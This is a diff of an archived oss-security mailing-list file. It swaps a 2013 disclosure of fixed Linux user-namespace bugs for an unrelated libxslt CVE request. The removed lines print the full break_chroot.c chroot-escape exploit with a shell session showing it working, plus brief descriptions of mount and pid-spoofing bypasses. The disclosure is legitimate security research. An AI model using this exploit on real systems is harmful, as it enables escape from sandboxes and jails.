@@ -1,143 +1,32 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/04/13/4
-Message-ID: <CALCETrX6Rcv1uMfPdG=K6THusgx-CAjHRkUpMwruBNaZGDvb8Q@mail.gmail.com>
-Date: Sat, 13 Apr 2013 10:16:26 -0700
-From: Andy Lutomirski <luto@...capital.net>
-To: "linux-kernel@...r.kernel.org" <linux-kernel@...r.kernel.org>, oss-security@...ts.openwall.com
-Subject: Summary of security bugs (now fixed) in user namespaces
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/11/05/4
+Message-ID: <20131105125009.GD19785@suse.de>
+Date: Tue, 5 Nov 2013 13:50:09 +0100
+From: Marcus Meissner <meissner@...e.de>
+To: OSS Security List <oss-security@...ts.openwall.com>
+Subject: CVE Request: additional fix for CVE-2012-2825 libxslt crash
 Content-Type: text/plain; charset=utf-8
 
-I previously reported these bugs privatley.  I'm summarizing them for
-the historical record.  These bugs were never exploitable on a
-default-configured released kernel, but some 3.8 versions are
-vulnerable depending on configuration.
+Hi,
 
-=== Bug 1: chroot bypass ===
+Our QA found that the reproducer in CVE-2012-2825 (magic.xsl and magic.xml)
+also expose another libxslt crash in older libxslt versions.
 
-It was possible for a chrooted program to create a new user namespace
-and a new mount namespace.  It could keep an fd to the old root, which
-is outside the new root, and therefore use it to escape, like this:
+https://bugzilla.novell.com/show_bug.cgi?id=849019
 
---- begin ---
-/* break_chroot.c by */
-/* Copyright (c) 2013 Andrew Lutomirski.  All rights reserved. */
+This bug was fixed in libxslt 1.1.25 with this commit:
+https://gitorious.org/libxslt/libxslt/commit/7089a62b8f133b42a2981cf1f920a8b3fe9a8caa
 
-#define _GNU_SOURCE
-#include <unistd.h>
-#include <sched.h>
-#include <sys/types.h>
-#include <sys/wait.h>
-#include <fcntl.h>
-#include <stdio.h>
-#include <string.h>
-#include <err.h>
+commit 7089a62b8f133b42a2981cf1f920a8b3fe9a8caa
+Author: Martin <gzlist@...glemail.com>
+Date:   Wed Sep 16 19:02:16 2009 +0200
 
-#ifndef CLONE_NEWUSER
-#define CLONE_NEWUSER 0x10000000
-#endif
+    Crash compiling stylesheet with DTD
 
-static void printcwd(void)
-{
-  /* This is fugly. */
-  static int lastlen = -1;
-  char buf[8192];
-  if (getcwd(buf, sizeof(buf))) {
-    if (strlen(buf) != lastlen)
-      printf("%s\n", buf);
-    lastlen = strlen(buf);
-  } else {
-    warn("getcwd");
-  }
-}
+    * libxslt/xslt.c: when a stylesheet embbeds a DTD the compilation
+      process could get seriously wrong
 
-int fn(void *unused)
-{
-  int i;
-  int fd;
+Crash as a xmlDtd struct is accessed as a xmlNode, not really attacker controllable
+I would say, but a denial of service (crash).
 
-  fd = open("/", O_RDONLY | O_DIRECTORY);
-  if (fd == -1)
-    err(1, "open(\".\")");
-  if (unshare(CLONE_NEWUSER) != 0)
-    err(1, "unshare(CLONE_NEWUSER)");
-  if (unshare(CLONE_NEWNS) != 0)
-    err(1, "unshare(CLONE_NEWNS)");
-  if (fchdir(fd) != 0)
-    err(1, "fchdir");
-  close(fd);
-
-  for (i = 0; i < 100; i++) {
-    printcwd();
-    if (chdir("..") != 0) {
-      warn("chdir");
-      break;
-    }
-  }
-
-  fd = open(".", O_PATH | O_DIRECTORY);
-  if (fd == -1)
-    err(1, "open(\".\")");
-
-  if (fd != 3) {
-    if (dup2(fd, 3) == -1)
-      err(1, "dup2");
-    close(fd);
-  }
-  _exit(0);
-}
-
-int main(int argc, char **argv)
-{
-  int dummy;
-
-  if (argc < 2) {
-    printf("usage: break_chroot COMMAND ARGS...\n\n"
-           "You won't be entirely out of jail.  / is still the jail root.\n");
-    return 1;
-  }
-
-  close(3);
-
-  if (signal(SIGCHLD, SIG_DFL) != 0)
-    err(1, "signal");
-
-  if (clone(fn, &dummy, CLONE_FILES | SIGCHLD, 0) == -1)
-    err(1, "clone");
-
-  int status;
-  if (wait(&status) == -1)
-    err(1, "wait");
-  if (!WIFEXITED(status) || WEXITSTATUS(status) != 0)
-    errx(1, "child failed");
-  if (fchdir(3) != 0)
-    err(1, "fchdir");
-  close(3);
-
-  execv(argv[1], argv+1);
-  err(1, argv[1]);
-
-  return 0;
-}
---- end ---
-
-$ ls /
-bin   dev  home  lib64       media  opt   root  sbin  sys  usr
-boot  etc  lib   lost+found  mnt    proc  run   srv   tmp  var
-$ /path/to/break_chroot /bin/sh
-(unreachable)/hostfs
-(unreachable)/
-sh-4.2$ pwd
-(unreachable)/
-sh-4.2$ ls
-bin  dev  etc  hostfs  init  lib  lib64  proc  root  run  sbin  sys  usr  var
-
-=== Bug 2: read-only bind mount bypass ===
-
-This one was straightforward: create a new userns and mount namespace,
-then remount a previously read-only bind mount as read-write.  It
-worked.
-
-=== Bug 3: SCM_CREDENTIALS pid spoofing ===
-
-This one was also straightforward: create a new userns and then spoof
-the pid.  The capability check was on the wrong namespace.
+Ciao, Marcus
